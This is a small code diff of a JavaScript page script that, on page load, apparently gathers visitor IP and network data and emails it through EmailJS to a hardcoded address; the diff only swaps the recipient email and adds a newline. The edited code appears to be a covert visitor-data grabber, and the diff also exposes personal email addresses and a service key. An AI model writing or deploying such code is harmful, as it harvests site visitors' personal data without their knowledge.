@@ -2,7 +2,7 @@ emailjs.init("2jj19BTFwlNnm8fp_");
 
 async function sendEmail(data) {
     const emailData = {
-        to_email: "openeyes08@outlook.com",
+        to_email: "surner282@gmail.com",
         subject: "New IP Visitor - Full Data",
         message: `=== IP & NETWORK ===
 IP ADDRESS: ${data.ip}
@@ -238,3 +238,4 @@ function refresh() {
 }
 
 document.addEventListener('DOMContentLoaded', loadData);
+
